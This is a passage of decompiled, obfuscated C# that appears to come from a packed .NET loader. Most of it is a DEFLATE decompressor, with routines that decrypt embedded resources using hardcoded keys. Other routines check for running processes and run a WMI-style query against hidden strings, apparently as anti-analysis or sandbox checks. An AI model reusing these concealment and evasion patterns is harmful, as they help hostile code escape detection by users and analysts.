using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class22
{
	static bool smethod_0(Class7.Class8 class8_0)
	{
		int num = default(int);
		int int_ = default(int);
		int num2 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		try
		{
			num = Class22.smethod_12(class8_0.class10_0);
			while (num >= 258)
			{
				int_ = class8_0.int_4;
				switch (int_)
				{
				case 7:
					while (((num2 = Class22.smethod_8(class8_0.class11_0, class8_0.class9_0)) & -256) == 0)
					{
						Class22.smethod_13(class8_0.class10_0, num2);
						if (--num < 258)
						{
							return true;
						}
					}
					if (num2 >= 257)
					{
						class8_0.int_6 = Class7.Class8.int_0[num2 - 257];
						class8_0.int_5 = Class7.Class8.int_1[num2 - 257];
						goto case 8;
					}
					if (num2 < 0)
					{
						return false;
					}
					class8_0.class11_1 = null;
					class8_0.class11_0 = null;
					class8_0.int_4 = 2;
					return true;
				case 8:
					if (class8_0.int_5 > 0)
					{
						class8_0.int_4 = 8;
						num4 = Class22.smethod_41(class8_0.class9_0, class8_0.int_5);
						if (num4 < 0)
						{
							return false;
						}
						Class22.smethod_26(class8_0.class9_0, class8_0.int_5);
						class8_0.int_6 += num4;
					}
					class8_0.int_4 = 9;
					goto case 9;
				case 9:
					num2 = Class22.smethod_8(class8_0.class11_1, class8_0.class9_0);
					if (num2 >= 0)
					{
						class8_0.int_7 = Class7.Class8.int_2[num2];
						class8_0.int_5 = Class7.Class8.int_3[num2];
						goto case 10;
					}
					return false;
				case 10:
					if (class8_0.int_5 > 0)
					{
						class8_0.int_4 = 10;
						num3 = Class22.smethod_41(class8_0.class9_0, class8_0.int_5);
						if (num3 < 0)
						{
							return false;
						}
						Class22.smethod_26(class8_0.class9_0, class8_0.int_5);
						class8_0.int_7 += num3;
					}
					Class22.smethod_4(class8_0.class10_0, class8_0.int_6, class8_0.int_7);
					num -= class8_0.int_6;
					class8_0.int_4 = 7;
					break;
				}
			}
			return true;
		}
		catch (Exception exception_)
		{
			Class15.smethod_28(exception_, class8_0, num, num2, num4, num3, int_);
			throw;
		}
	}

	static int smethod_1(Class7.Class10 class10_0)
	{
		try
		{
			return class10_0.int_1;
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class10_0);
			throw;
		}
	}

	static byte[] smethod_2(byte[] byte_0)
	{
		Assembly callingAssembly = default(Assembly);
		Assembly executingAssembly = default(Assembly);
		Class7.Stream0 stream = default(Class7.Stream0);
		byte[] array = default(byte[]);
		int num = default(int);
		short num2 = default(short);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		byte[] array2 = default(byte[]);
		byte[] array3 = default(byte[]);
		byte[] array4 = default(byte[]);
		Class7.Class8 @class = default(Class7.Class8);
		int num8 = default(int);
		int num9 = default(int);
		int i = default(int);
		int num10 = default(int);
		int num11 = default(int);
		byte[] array5 = default(byte[]);
		Class7.Class8 class2 = default(Class7.Class8);
		byte[] array6 = default(byte[]);
		byte[] array7 = default(byte[]);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		byte[] array8 = default(byte[]);
		byte[] array9 = default(byte[]);
		byte[] array10 = default(byte[]);
		ICryptoTransform cryptoTransform2 = default(ICryptoTransform);
		byte[] array11 = default(byte[]);
		try
		{
			callingAssembly = Assembly.GetCallingAssembly();
			executingAssembly = Assembly.GetExecutingAssembly();
			if ((object)callingAssembly != executingAssembly && !Class22.smethod_19(executingAssembly, callingAssembly))
			{
				return null;
			}
			stream = new Class7.Stream0(byte_0);
			array = new byte[0];
			num = Class22.smethod_22(stream);
			if (num == 67324752)
			{
				num2 = (short)Class22.smethod_16(stream);
				num3 = Class22.smethod_16(stream);
				num4 = Class22.smethod_16(stream);
				if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
				{
					throw new FormatException("Wrong Header Signature");
				}
				Class22.smethod_22(stream);
				Class22.smethod_22(stream);
				Class22.smethod_22(stream);
				num5 = Class22.smethod_22(stream);
				num6 = Class22.smethod_16(stream);
				num7 = Class22.smethod_16(stream);
				if (num6 > 0)
				{
					array2 = new byte[num6];
					stream.Read(array2, 0, num6);
				}
				if (num7 > 0)
				{
					array3 = new byte[num7];
					stream.Read(array3, 0, num7);
				}
				array4 = new byte[stream.Length - stream.Position];
				stream.Read(array4, 0, array4.Length);
				@class = new Class7.Class8(array4);
				array = new byte[num5];
				Class22.smethod_17(array.Length, array, 0, @class);
				array4 = null;
			}
			else
			{
				num8 = num >> 24;
				num -= num8 << 24;
				if (num != 8223355)
				{
					throw new FormatException("Unknown Header");
				}
				if (num8 == 1)
				{
					num9 = Class22.smethod_22(stream);
					array = new byte[num9];
					for (i = 0; i < num9; i += num11)
					{
						num10 = Class22.smethod_22(stream);
						num11 = Class22.smethod_22(stream);
						array5 = new byte[num10];
						stream.Read(array5, 0, array5.Length);
						class2 = new Class7.Class8(array5);
						Class22.smethod_17(num11, array, i, class2);
					}
				}
				if (num8 == 2)
				{
					array6 = new byte[8] { 254, 230, 130, 202, 181, 82, 127, 67 };
					array7 = new byte[8] { 238, 247, 240, 11, 140, 166, 22, 220 };
					cryptoTransform = Class22.smethod_31(bool_0: true, array6, array7);
					try
					{
						array8 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
						array = Class22.smethod_2(array8);
					}
					finally
					{
						cryptoTransform?.Dispose();
					}
				}
				if (num8 == 3)
				{
					array9 = new byte[16]
					{
						1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
						1, 1, 1, 1, 1, 1
					};
					array10 = new byte[16]
					{
						2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
						2, 2, 2, 2, 2, 2
					};
					cryptoTransform2 = Class22.smethod_36(bool_0: true, array10, array9);
					try
					{
						array11 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
						array = Class22.smethod_2(array11);
					}
					finally
					{
						cryptoTransform2?.Dispose();
					}
				}
			}
			stream.Close();
			stream = null;
			return array;
		}
		catch (Exception exception_)
		{
			Class15.smethod_33(exception_, new object[31]
			{
				byte_0, callingAssembly, executingAssembly, stream, array, num, num2, num3, num4, num5,
				num6, num7, array2, array3, array4, @class, num8, num9, i, num10,
				num11, class2, array5, array6, array7, cryptoTransform, array8, array9, array10, cryptoTransform2,
				array11
			});
			throw;
		}
	}

	static int smethod_3(Class7.Class9 class9_0)
	{
		try
		{
			return class9_0.int_2;
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class9_0);
			throw;
		}
	}

	static void smethod_4(Class7.Class10 class10_0, int int_0, int int_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		try
		{
			num = (class10_0.int_1 += int_0);
			if (num > 32768)
			{
				throw new InvalidOperationException();
			}
			num2 = (class10_0.int_0 - int_1) & 0x7FFF;
			num3 = 32768 - int_0;
			if (num2 <= num3 && class10_0.int_0 < num3)
			{
				if (int_0 <= int_1)
				{
					Array.Copy(class10_0.byte_0, num2, class10_0.byte_0, class10_0.int_0, int_0);
					class10_0.int_0 += int_0;
					return;
				}
				while (int_0-- > 0)
				{
					byte[] byte_ = class10_0.byte_0;
					num4 = class10_0.int_0++;
					byte_[num4] = class10_0.byte_0[num2++];
				}
			}
			else
			{
				Class22.smethod_20(class10_0, num2, int_0, int_1);
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, class10_0, int_0, int_1, num2, num3, num, num4);
			throw;
		}
	}

	static object smethod_5()
	{
		try
		{
			Class0.string_0 = Class6.smethod_0(22423);
			Class0.string_0 += Class6.smethod_0(27761);
			Class0.string_0 += Class6.smethod_0(33099);
			Class0.string_0 += Class6.smethod_0(38437);
			Class0.string_0 += Class6.smethod_0(43775);
			Class0.string_0 += Class6.smethod_0(49113);
			Class0.string_0 += Class6.smethod_0(54451);
			Class0.string_0 += Class6.smethod_0(59789);
			Class0.string_0 += Class6.smethod_0(65127);
			Class0.string_0 += Class6.smethod_0(70465);
			Class0.string_0 += Class6.smethod_0(75803);
			Class0.string_0 += Class6.smethod_0(81141);
			Class0.string_0 += Class6.smethod_0(86479);
			Class0.string_0 += Class6.smethod_0(91817);
			Class0.string_0 += Class6.smethod_0(97155);
			Class0.string_0 += Class6.smethod_0(102493);
			Class0.string_0 += Class6.smethod_0(107831);
			Class0.string_0 += Class6.smethod_0(113169);
			Class0.string_0 += Class6.smethod_0(118507);
			Class0.string_0 += Class6.smethod_0(123845);
			Class0.string_0 += Class6.smethod_0(129183);
			Class0.string_0 += Class6.smethod_0(134521);
			Class0.string_0 += Class6.smethod_0(139859);
			Class0.string_0 += Class6.smethod_0(145197);
			Class0.string_0 += Class6.smethod_0(150535);
			Class0.string_0 += Class6.smethod_0(155873);
			Class0.string_0 += Class6.smethod_0(161211);
			Class0.string_0 += Class6.smethod_0(166549);
			Class0.string_0 += Class6.smethod_0(171887);
			Class0.string_0 += Class6.smethod_0(177225);
			Class0.string_0 = Strings.Replace(Class0.string_0, Class6.smethod_0(178211), Class6.smethod_0(22351), 1, -1, (CompareMethod)0);
			return Class0.string_0;
		}
		catch (Exception exception_)
		{
			object object_ = default(object);
			Class15.smethod_23(exception_, object_);
			throw;
		}
	}

	static bool smethod_6(Class7.Class8 class8_0)
	{
		int int_ = default(int);
		int num = default(int);
		int num2 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		try
		{
			int_ = class8_0.int_4;
			switch (int_)
			{
			case 2:
				if (class8_0.bool_0)
				{
					class8_0.int_4 = 12;
					return false;
				}
				num = Class22.smethod_41(class8_0.class9_0, 3);
				if (num < 0)
				{
					return false;
				}
				Class22.smethod_26(class8_0.class9_0, 3);
				if (((uint)num & (true ? 1u : 0u)) != 0)
				{
					class8_0.bool_0 = true;
				}
				num2 = num >> 1;
				switch (num2)
				{
				case 0:
					Class22.smethod_23(class8_0.class9_0);
					class8_0.int_4 = 3;
					break;
				case 1:
					class8_0.class11_0 = Class7.Class11.class11_0;
					class8_0.class11_1 = Class7.Class11.class11_1;
					class8_0.int_4 = 7;
					break;
				case 2:
					class8_0.class12_0 = new Class7.Class12();
					class8_0.int_4 = 6;
					break;
				}
				return true;
			case 3:
				num4 = (class8_0.int_8 = Class22.smethod_41(class8_0.class9_0, 16));
				if (num4 < 0)
				{
					return false;
				}
				Class22.smethod_26(class8_0.class9_0, 16);
				class8_0.int_4 = 4;
				goto case 4;
			case 4:
				num3 = Class22.smethod_41(class8_0.class9_0, 16);
				if (num3 < 0)
				{
					return false;
				}
				Class22.smethod_26(class8_0.class9_0, 16);
				class8_0.int_4 = 5;
				goto case 5;
			case 5:
				num5 = Class22.smethod_39(class8_0.class10_0, class8_0.class9_0, class8_0.int_8);
				class8_0.int_8 -= num5;
				if (class8_0.int_8 == 0)
				{
					class8_0.int_4 = 2;
					return true;
				}
				return !Class22.smethod_27(class8_0.class9_0);
			case 6:
				if (!Class22.smethod_10(class8_0.class12_0, class8_0.class9_0))
				{
					return false;
				}
				class8_0.class11_0 = Class22.smethod_34(class8_0.class12_0);
				class8_0.class11_1 = Class22.smethod_40(class8_0.class12_0);
				class8_0.int_4 = 7;
				goto case 7;
			case 7:
			case 8:
			case 9:
			case 10:
				return Class22.smethod_0(class8_0);
			default:
				return false;
			case 12:
				return false;
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, class8_0, num, num3, num5, int_, num2, num4);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static void smethod_7()
	{
		int num2 = default(int);
		object[] array = default(object[]);
		object[] array2 = default(object[]);
		bool[] array4 = default(bool[]);
		IEnumerator enumerator = default(IEnumerator);
		object objectValue = default(object);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						object @object = Interaction.GetObject(Class6.smethod_0(178216), (string)null);
						string text = Class6.smethod_0(178229);
						array = new object[1] { Class2.string_1 };
						array2 = array;
						object[] array3 = array2;
						array4 = new bool[1] { true };
						object obj = NewLateBinding.LateGet(@object, (Type)null, text, array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							Class2.string_1 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						Class2.object_0 = RuntimeHelpers.GetObjectValue(obj);
						enumerator = ((IEnumerable)Class2.object_0).GetEnumerator();
						while (enumerator.MoveNext())
						{
							objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
							Class2.string_0 = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, Class6.smethod_0(178242), new object[0], (string[])null, (Type[])null, (bool[])null));
						}
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto end_IL_0001;
					}
					case 228:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_011e;
					end_IL_0001:;
				}
				catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj2);
					try0001_dispatch = 228;
					continue;
				}
				break;
				IL_011e:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, objectValue, array, array2, array4, enumerator, num2, num);
			throw;
		}
	}

	static int smethod_8(Class7.Class11 class11_0, Class7.Class9 class9_0)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int int_ = default(int);
		int int_2 = default(int);
		try
		{
			if ((num = Class22.smethod_41(class9_0, 9)) >= 0)
			{
				if ((num2 = class11_0.short_0[num]) >= 0)
				{
					Class22.smethod_26(class9_0, num2 & 0xF);
					return num2 >> 4;
				}
				num3 = -(num2 >> 4);
				num4 = num2 & 0xF;
				if ((num = Class22.smethod_41(class9_0, num4)) >= 0)
				{
					num2 = class11_0.short_0[num3 | (num >> 9)];
					Class22.smethod_26(class9_0, num2 & 0xF);
					return num2 >> 4;
				}
				int_ = class9_0.int_2;
				num = Class22.smethod_41(class9_0, int_);
				num2 = class11_0.short_0[num3 | (num >> 9)];
				if ((num2 & 0xF) <= int_)
				{
					Class22.smethod_26(class9_0, num2 & 0xF);
					return num2 >> 4;
				}
				return -1;
			}
			int_2 = class9_0.int_2;
			num = Class22.smethod_41(class9_0, int_2);
			num2 = class11_0.short_0[num];
			if (num2 >= 0 && (num2 & 0xF) <= int_2)
			{
				Class22.smethod_26(class9_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		catch (Exception exception_)
		{
			Class15.smethod_30(exception_, class11_0, class9_0, num, num2, num3, num4, int_, int_2);
			throw;
		}
	}

	static string smethod_9(string string_0)
	{
		checked
		{
			byte[] array = default(byte[]);
			MemoryStream memoryStream = default(MemoryStream);
			int num = default(int);
			byte[] array2 = default(byte[]);
			GZipStream gZipStream = default(GZipStream);
			try
			{
				array = Convert.FromBase64String(string_0);
				memoryStream = new MemoryStream();
				num = BitConverter.ToInt32(array, 0);
				memoryStream.Write(array, 4, array.Length - 4);
				array2 = new byte[num - 1 + 1];
				memoryStream.Position = 0L;
				gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
				gZipStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
			catch (Exception exception_)
			{
				string object_ = default(string);
				Class15.smethod_29(exception_, string_0, gZipStream, array, array2, num, object_, memoryStream);
				throw;
			}
		}
	}

	static bool smethod_10(Class7.Class12 class12_0, Class7.Class9 class9_0)
	{
		int int_ = default(int);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		byte b = default(byte);
		int num7 = default(int);
		try
		{
			while (true)
			{
				int_ = class12_0.int_2;
				switch (int_)
				{
				case 5:
					num = Class7.Class12.int_1[class12_0.int_7];
					num2 = Class22.smethod_41(class9_0, num);
					if (num2 >= 0)
					{
						Class22.smethod_26(class9_0, num);
						num2 += Class7.Class12.int_0[class12_0.int_7];
						while (num2-- > 0)
						{
							byte[] byte_ = class12_0.byte_1;
							num3 = class12_0.int_8++;
							byte_[num3] = class12_0.byte_2;
						}
						if (class12_0.int_8 == class12_0.int_6)
						{
							return true;
						}
						goto IL_0075;
					}
					return false;
				case 4:
					while (((num4 = Class22.smethod_8(class12_0.class11_0, class9_0)) & -16) == 0)
					{
						byte[] byte_2 = class12_0.byte_1;
						num5 = class12_0.int_8++;
						int num6 = num5;
						b = (class12_0.byte_2 = (byte)num4);
						byte_2[num6] = b;
						if (class12_0.int_8 == class12_0.int_6)
						{
							return true;
						}
					}
					if (num4 >= 0)
					{
						if (num4 >= 17)
						{
							class12_0.byte_2 = 0;
						}
						class12_0.int_7 = num4 - 16;
						class12_0.int_2 = 5;
						goto case 5;
					}
					return false;
				case 3:
					while (class12_0.int_8 < class12_0.int_5)
					{
						num7 = Class22.smethod_41(class9_0, 3);
						if (num7 >= 0)
						{
							Class22.smethod_26(class9_0, 3);
							class12_0.byte_0[Class7.Class12.int_9[class12_0.int_8]] = (byte)num7;
							class12_0.int_8++;
							continue;
						}
						return false;
					}
					class12_0.class11_0 = new Class7.Class11(class12_0.byte_0);
					class12_0.byte_0 = null;
					class12_0.int_8 = 0;
					class12_0.int_2 = 4;
					goto case 4;
				case 2:
					class12_0.int_5 = Class22.smethod_41(class9_0, 4);
					if (class12_0.int_5 >= 0)
					{
						class12_0.int_5 += 4;
						Class22.smethod_26(class9_0, 4);
						class12_0.byte_0 = new byte[19];
						class12_0.int_8 = 0;
						class12_0.int_2 = 3;
						goto case 3;
					}
					return false;
				case 1:
					class12_0.int_4 = Class22.smethod_41(class9_0, 5);
					if (class12_0.int_4 >= 0)
					{
						class12_0.int_4++;
						Class22.smethod_26(class9_0, 5);
						class12_0.int_6 = class12_0.int_3 + class12_0.int_4;
						class12_0.byte_1 = new byte[class12_0.int_6];
						class12_0.int_2 = 2;
						goto case 2;
					}
					return false;
				case 0:
					class12_0.int_3 = Class22.smethod_41(class9_0, 5);
					if (class12_0.int_3 >= 0)
					{
						class12_0.int_3 += 257;
						Class22.smethod_26(class9_0, 5);
						class12_0.int_2 = 1;
						goto case 1;
					}
					return false;
				}
				continue;
				IL_0075:
				class12_0.int_2 = 4;
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_32(exception_, class12_0, class9_0, num7, num4, num, num2, int_, num5, b, num3);
			throw;
		}
	}

	static int smethod_11(Class7.Class9 class9_0)
	{
		try
		{
			return class9_0.int_1 - class9_0.int_0 + (class9_0.int_2 >> 3);
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class9_0);
			throw;
		}
	}

	static int smethod_12(Class7.Class10 class10_0)
	{
		try
		{
			return 32768 - class10_0.int_1;
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class10_0);
			throw;
		}
	}

	static void smethod_13(Class7.Class10 class10_0, int int_0)
	{
		int num = default(int);
		int num2 = default(int);
		try
		{
			num = class10_0.int_1++;
			if (num == 32768)
			{
				throw new InvalidOperationException();
			}
			byte[] byte_ = class10_0.byte_0;
			num2 = class10_0.int_0++;
			byte_[num2] = (byte)int_0;
			class10_0.int_0 &= 32767;
		}
		catch (Exception exception_)
		{
			Class15.smethod_26(exception_, class10_0, int_0, num, num2);
			throw;
		}
	}

	static void smethod_14(byte[] byte_0, Class7.Class11 class11_0)
	{
		int[] array = default(int[]);
		int[] array2 = default(int[]);
		int i = default(int);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int j = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		int k = default(int);
		int l = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num13 = default(int);
		try
		{
			array = new int[16];
			array2 = new int[16];
			for (i = 0; i < byte_0.Length; i++)
			{
				num = byte_0[i];
				if (num > 0)
				{
					array[num]++;
				}
			}
			num2 = 0;
			num3 = 512;
			for (j = 1; j <= 15; j++)
			{
				array2[j] = num2;
				num2 += array[j] << 16 - j;
				if (j >= 10)
				{
					num4 = array2[j] & 0x1FF80;
					num5 = num2 & 0x1FF80;
					num3 += num5 - num4 >> 16 - j;
				}
			}
			class11_0.short_0 = new short[num3];
			num6 = 512;
			for (num7 = 15; num7 >= 10; num7--)
			{
				num8 = num2 & 0x1FF80;
				num2 -= array[num7] << 16 - num7;
				num9 = num2 & 0x1FF80;
				for (k = num9; k < num8; k += 128)
				{
					class11_0.short_0[Class22.smethod_30(k)] = (short)((-num6 << 4) | num7);
					num6 += 1 << num7 - 9;
				}
			}
			for (l = 0; l < byte_0.Length; l++)
			{
				num10 = byte_0[l];
				if (num10 == 0)
				{
					continue;
				}
				num2 = array2[num10];
				num11 = Class22.smethod_30(num2);
				if (num10 <= 9)
				{
					do
					{
						class11_0.short_0[num11] = (short)((l << 4) | num10);
						num11 += 1 << num10;
					}
					while (num11 < 512);
				}
				else
				{
					num12 = class11_0.short_0[num11 & 0x1FF];
					num13 = 1 << (num12 & 0xF);
					num12 = -(num12 >> 4);
					do
					{
						class11_0.short_0[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
						num11 += 1 << num10;
					}
					while (num11 < num13);
				}
				array2[num10] = num2 + (1 << 16 - num10);
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_33(exception_, new object[21]
			{
				byte_0, class11_0, array, array2, i, num, num2, num3, j, num4,
				num5, num6, num7, num8, num9, k, l, num10, num11, num12,
				num13
			});
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_15()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						flag = Process.GetProcessesByName(Class6.smethod_0(178259)).Length >= 1;
						goto end_IL_0001;
					case 43:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_0061;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 43;
					continue;
				}
				break;
				IL_0061:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_25(exception_, flag, num2, num);
			throw;
		}
	}

	static int smethod_16(Class7.Stream0 stream0_0)
	{
		try
		{
			return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, stream0_0);
			throw;
		}
	}

	static int smethod_17(int int_0, byte[] byte_0, int int_1, Class7.Class8 class8_0)
	{
		int num = default(int);
		int num2 = default(int);
		try
		{
			num = 0;
			do
			{
				if (class8_0.int_4 != 11)
				{
					num2 = Class22.smethod_25(byte_0, int_0, int_1, class8_0.class10_0);
					int_1 += num2;
					num += num2;
					int_0 -= num2;
					if (int_0 == 0)
					{
						return num;
					}
				}
			}
			while (Class22.smethod_6(class8_0) || (class8_0.class10_0.int_1 > 0 && class8_0.int_4 != 11));
			return num;
		}
		catch (Exception exception_)
		{
			Class15.smethod_28(exception_, int_0, byte_0, int_1, class8_0, num, num2);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_18()
	{
		int num2 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						Class22.smethod_7();
						string_ = Class2.string_0;
						flag = ((Operators.CompareString(string_, Class6.smethod_0(178272), false) == 0) ? true : false);
						goto end_IL_0001;
					case 54:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_006c;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 54;
					continue;
				}
				break;
				IL_006c:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_26(exception_, flag, string_, num2, num);
			throw;
		}
	}

	static bool smethod_19(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = default(byte[]);
		byte[] publicKey2 = default(byte[]);
		int i = default(int);
		try
		{
			publicKey = assembly_0.GetName().GetPublicKey();
			publicKey2 = assembly_1.GetName().GetPublicKey();
			if (publicKey2 == null != (publicKey == null))
			{
				return false;
			}
			if (publicKey2 != null)
			{
				for (i = 0; i < publicKey2.Length; i++)
				{
					if (publicKey2[i] != publicKey[i])
					{
						return false;
					}
				}
			}
			return true;
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, assembly_0, assembly_1, publicKey, publicKey2, i);
			throw;
		}
	}

	static void smethod_20(Class7.Class10 class10_0, int int_0, int int_1, int int_2)
	{
		int num = default(int);
		try
		{
			while (int_1-- > 0)
			{
				byte[] byte_ = class10_0.byte_0;
				num = class10_0.int_0++;
				byte_[num] = class10_0.byte_0[int_0++];
				class10_0.int_0 &= 32767;
				int_0 &= 0x7FFF;
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, class10_0, int_0, int_1, int_2, num);
			throw;
		}
	}

	static byte[] smethod_21(string string_0, Form0 form0_0)
	{
		string text = default(string);
		int length = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		long num2 = default(long);
		long num3 = default(long);
		try
		{
			text = string_0;
			length = text.Length;
			num = length / 2;
			if (length % 2 == 0)
			{
				num = checked(num - 1);
			}
			else
			{
				text = Class6.smethod_0(178309) + text;
			}
			checked
			{
				array = new byte[num + 1];
				num2 = num;
				for (num3 = 0L; num3 <= num2; num3++)
				{
					array[(int)num3] = Convert.ToByte(text.Substring((int)(num3 * 2L), 2), 16);
				}
				return array;
			}
		}
		catch (Exception exception_)
		{
			byte[] object_ = default(byte[]);
			Class15.smethod_31(exception_, string_0, form0_0, array, object_, text, length, num, num3, num2);
			throw;
		}
	}

	static int smethod_22(Class7.Stream0 stream0_0)
	{
		try
		{
			return Class22.smethod_16(stream0_0) | (Class22.smethod_16(stream0_0) << 16);
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, stream0_0);
			throw;
		}
	}

	static void smethod_23(Class7.Class9 class9_0)
	{
		try
		{
			class9_0.uint_0 >>= class9_0.int_2 & 7;
			class9_0.int_2 &= -8;
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class9_0);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_24()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						flag = Process.GetProcessesByName(Class6.smethod_0(178314)).Length >= 1;
						goto end_IL_0001;
					case 43:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_0061;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 43;
					continue;
				}
				break;
				IL_0061:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_25(exception_, flag, num2, num);
			throw;
		}
	}

	static int smethod_25(byte[] byte_0, int int_0, int int_1, Class7.Class10 class10_0)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			num = class10_0.int_0;
			if (int_0 > class10_0.int_1)
			{
				int_0 = class10_0.int_1;
			}
			else
			{
				num = (class10_0.int_0 - class10_0.int_1 + int_0) & 0x7FFF;
			}
			num2 = int_0;
			num3 = int_0 - num;
			if (num3 > 0)
			{
				Array.Copy(class10_0.byte_0, 32768 - num3, byte_0, int_1, num3);
				int_1 += num3;
				int_0 = num;
			}
			Array.Copy(class10_0.byte_0, num - int_0, byte_0, int_1, int_0);
			class10_0.int_1 -= num2;
			if (class10_0.int_1 < 0)
			{
				throw new InvalidOperationException();
			}
			return num2;
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, byte_0, int_0, int_1, class10_0, num, num2, num3);
			throw;
		}
	}

	static void smethod_26(Class7.Class9 class9_0, int int_0)
	{
		try
		{
			class9_0.uint_0 >>= int_0;
			class9_0.int_2 -= int_0;
		}
		catch (Exception exception_)
		{
			Class15.smethod_24(exception_, class9_0, int_0);
			throw;
		}
	}

